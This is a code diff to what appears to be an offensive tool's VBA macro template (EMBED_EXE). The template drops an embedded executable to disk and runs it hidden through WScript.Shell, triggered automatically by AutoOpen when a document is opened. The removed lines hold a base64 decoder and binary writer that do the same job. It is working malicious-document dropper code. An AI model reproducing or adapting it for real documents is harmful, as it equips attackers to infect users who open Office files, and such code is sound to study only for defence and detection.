@@ -279,58 +279,18 @@ End Sub
 
 EMBED_EXE = \
 r"""
-' Code from https://github.com/khr0x40sh/MacroShop
-' Copyright (c) 2015 khr0x40sh under MIT license
+' orininally inspired from https://github.com/khr0x40sh/MacroShop
 
-Option Explicit
+'Option Explicit
 
-Const TypeBinary = 1
-Const ForReading = 1, ForWriting = 2, ForAppending = 8
-
-
-Private Function decodeBase64(base64)
-    Dim DM, EL
-    Set DM = CreateObject("Microsoft.XMLDOM")
-    ' Create temporary node with Base64 data type
-    Set EL = DM.createElement("tmp")
-    EL.DataType = "bin.base64"
-    ' Set encoded String, get bytes
-    EL.Text = base64
-    decodeBase64 = EL.NodeTypedValue
-End Function
-
-Private Sub writeBytes(file, bytes)
-    Dim binaryStream
-    Set binaryStream = CreateObject("ADODB.Stream")
-    binaryStream.Type = TypeBinary
-    'Open the stream and write binary data
-    binaryStream.Open
-    binaryStream.Write bytes
-    'Save binary data to disk
-    binaryStream.SaveToFile file, ForWriting
+Private Sub executeEmbed()
+    CreateBinFile "<<<OUT_FILE>>>", readEmbed
+    CreateObject("WScript.Shell").Run "<<<OUT_FILE>>>", 0
 End Sub
-
-Private Sub DecodeExec()
-    Dim out1 As String
-    <<<DECODE_CHUNKS>>>
-
-    Dim decode
-    decode = decodeBase64(out1)
-    Dim outFile
-    outFile = "<<<OUT_FILE>>>"
-    Call writeBytes(outFile, decode)
-    
-    Dim retVal
-    'retVal = Shell(outFile, 0)
-    retVal = CreateObject("WScript.Shell").Run outFile, 0
-End Sub
-
-
-<<<STRINGS>>>
 
 ' Auto launch when VBA enabled
 Sub AutoOpen()
-    DecodeExec
+    executeEmbed
 End Sub
 
 """
